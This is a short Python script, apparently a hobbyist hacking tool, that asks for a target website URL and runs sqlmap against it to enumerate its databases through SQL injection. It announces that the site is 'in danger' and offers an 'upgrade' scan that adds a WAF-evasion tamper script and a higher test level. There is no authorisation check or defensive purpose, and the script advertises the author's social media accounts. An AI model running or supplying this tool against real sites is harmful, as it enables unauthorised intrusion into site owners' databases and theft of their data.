import subprocess
from time import sleep

print("""

My Social Media Accounts

instagram.com/alm3jzh

tiktok.com/@alm3jzh
      
""")

def site_url():
    target_site = input("""[+] Enter Your Target Site

    example

    https://alm3jzh.com/php?=example

    - > :  """)
    sleep(2)
    print((f"[!] The Site Is Under Reconnaissance And In Danger !!!!"))
    sleep(2)
    print("[!] The Site Is Well Done ........")
    subprocess.call(['sqlmap', '-u', target_site, '--random-agent', '--batch', '--dbs'])

    error = "[*] ending @ 17:27:41 /2023-10-18/"

    print("Do you want to Upgrade The Scan ? [Y/n] : ")
    user_input = input().strip().lower()  # Get user input and convert to lowercase

    if user_input == 'y':
        subprocess.call(['sqlmap', '-u', target_site, '--random-agent', '--batch', '--dbs', '--tamper=space2comment', '--level=3'])
        # Add your installation logic here
    elif user_input == 'n':
        print("Hi With You alm3jzh Think You To Use This Tool My Instagram.com/alm3jzh")
        sleep(5)
        return  # Return from the function to exit it
    else:
        print("Invalid input. Please enter 'Y' or 'n.")

site_url()